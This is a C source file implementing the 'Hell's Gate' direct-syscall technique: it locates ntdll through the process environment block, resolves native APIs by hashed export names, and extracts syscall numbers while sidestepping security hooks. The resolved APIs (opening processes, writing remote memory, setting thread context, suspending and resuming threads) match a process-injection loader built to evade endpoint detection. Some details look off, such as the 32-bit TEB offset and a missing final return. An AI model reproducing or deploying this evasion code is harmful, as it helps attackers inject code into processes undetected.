#include "header.h"

// Hells Gate functions
PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x92351f259ecd12a;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

VOID PrintHashes() {

	PCHAR Apis[] = {
		"NtOpenProcess",
		"NtOpenThread",
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtGetContextThread",
		"NtSetContextThread",
		"NtResumeThread",
		"NtSuspendThread",
		"NtWaitForSingleObject",
		"NtClose",
	};

	// Hash definitions
	for (INT i = 0; i < sizeof(Apis) / sizeof(Apis[0]); i++) {
		printf("#define %s_HASH 0x%p\n", Apis[i], djb2(Apis[i]));
	}

	printf("\n");

	// Hell's Gate table initialization
	for (INT i = 0; i < sizeof(Apis) / sizeof(Apis[0]); i++) {
		printf("Table->%s.dwHash = %s_HASH; \nif (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->%s)) {\n\tPRINT_ERROR(\"GetVxTableEntry [%s]\");\n\treturn FALSE;\n}\n\n", Apis[i], Apis[i], Apis[i], Apis[i]);
	}
}


BOOL InitializeDirectSyscalls(IN PVX_TABLE Table) {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;


	Table->NtOpenProcess.dwHash = NtOpenProcess_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtOpenProcess)) {
		PRINT_ERROR("GetVxTableEntry [NtOpenProcess]");
		return FALSE;
	}

	Table->NtOpenThread.dwHash = NtOpenThread_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtOpenThread)) {
		PRINT_ERROR("GetVxTableEntry [NtOpenThread]");
		return FALSE;
	}

	Table->NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtAllocateVirtualMemory)) {
		PRINT_ERROR("GetVxTableEntry [NtAllocateVirtualMemory]");
		return FALSE;
	}

	Table->NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtWriteVirtualMemory)) {
		PRINT_ERROR("GetVxTableEntry [NtWriteVirtualMemory]");
		return FALSE;
	}

	Table->NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtProtectVirtualMemory)) {
		PRINT_ERROR("GetVxTableEntry [NtProtectVirtualMemory]");
		return FALSE;
	}

	Table->NtGetContextThread.dwHash = NtGetContextThread_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtGetContextThread)) {
		PRINT_ERROR("GetVxTableEntry [NtGetContextThread]");
		return FALSE;
	}

	Table->NtSetContextThread.dwHash = NtSetContextThread_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtSetContextThread)) {
		PRINT_ERROR("GetVxTableEntry [NtSetContextThread]");
		return FALSE;
	}

	Table->NtResumeThread.dwHash = NtResumeThread_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtResumeThread)) {
		PRINT_ERROR("GetVxTableEntry [NtResumeThread]");
		return FALSE;
	}

	Table->NtSuspendThread.dwHash = NtSuspendThread_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtSuspendThread)) {
		PRINT_ERROR("GetVxTableEntry [NtSuspendThread]");
		return FALSE;
	}

	Table->NtWaitForSingleObject.dwHash = NtWaitForSingleObject_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtWaitForSingleObject)) {
		PRINT_ERROR("GetVxTableEntry [NtWaitForSingleObject]");
		return FALSE;
	}

	Table->NtClose.dwHash = NtClose_HASH;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->NtClose)) {
		PRINT_ERROR("GetVxTableEntry [NtClose]");
		return FALSE;
	}
}